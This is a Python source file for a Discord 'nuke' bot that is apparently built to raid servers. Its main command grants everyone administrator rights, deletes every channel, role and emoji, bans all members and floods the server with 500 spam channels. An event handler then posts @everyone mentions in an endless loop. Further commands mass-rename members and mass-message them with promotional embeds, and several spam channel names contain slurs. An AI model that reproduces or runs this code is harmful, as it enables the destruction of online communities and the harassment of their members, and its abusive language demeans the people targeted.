import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

# Check readme.md for lastest updates

token = "AddHere"

# If you are having issues, watch this video: https://streamable.com/7eovst or follow message listed below

#  If it says Shared ID None is requesting privileged intents, go to discord developer portal and go to your bot and click on the bot tab and then scroll down to where it says privileged gateway intents and enable both, then it should work

SPAM_CHANNEL =  ["retard-mods" , "imagine-being-nuked" , "wassup-sis" , "ez-peez-bro","dont-mess-with-us","adopted ","nuked nuked","how are u feeling","take-some-pings","Get on my level but you cant","helo-simps","have-fun-bois","leave-this-server-nerds","retard-owner-haha"]  
SPAM_MESSAGE = ["@everyone @here Server Got Raided How are ya feeling XD"]

intents = discord.Intents(messages=True, guilds=True, members=True)

client = commands.Bot(command_prefix='.', intents=intents)


@client.event
async def on_ready():
   print('''    ____  _                          __   _   __      __           ____        __ 
   / __ \(_)_____________  _________/ /  / | / /_  __/ /_____     / __ )____  / /_
  / / / / / ___/ ___/ __ \/ ___/ __  /  /  |/ / / / / //_/ _ \   / __  / __ \/ __/
 / /_/ / (__  ) /__/ /_/ / /  / /_/ /  / /|  / /_/ / ,< /  __/  / /_/ / /_/ / /_  
/_____/_/____/\___/\____/_/   \__,_/  /_/ |_/\__,_/_/|_|\___/  /_____/\____/\__/''')
   await client.change_presence(activity=discord.Game(name="With Kittens"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully!" + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Obama's Step Son#1557")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Sub To Astrotrek")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    return

@client.command(pass_context=True)
async def ObamaRename(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")

@client.command(pass_context=True)
async def ObamaMessage(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="Sub To Astrotrek", description="Obama's Step Son ON TOP" , color=discord.Colour.purple())
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Sub To Astrotrek")
            await asyncio.sleep(3) # This is a delay on the command so the bot doesn't get rate limited, if you remove this the bot might get banned or rate limited
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
        

@client.command(pass_context=True)
async def ObamaEmoji(ctx):
      for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass   

@client.command(pass_context=True)
async def ObamaRole(ctx):
  for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass          

@client.command(pass_context=True)
@commands.is_owner()
async def ObamaHelp(ctx):
    await ctx.message.delete()
    await asyncio.sleep(0)
    try:
            embed = discord.Embed(title="Made By Obama's Step Son#1557", description="Commands: \n \n .ObamaEmoji (deletes all emojis) \n **.Obama (main command)** \n .ObamaMessage (messages everyone in the server)  \n .ObamaRole (deletes all roles) \n .ObamaRename (renames everyone to whatever you specify) " , color=discord.Colour.purple())
            embed.set_footer(text="Sub To Astrotrek")
            await ctx.author.send(embed=embed)
    except:
            pass


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)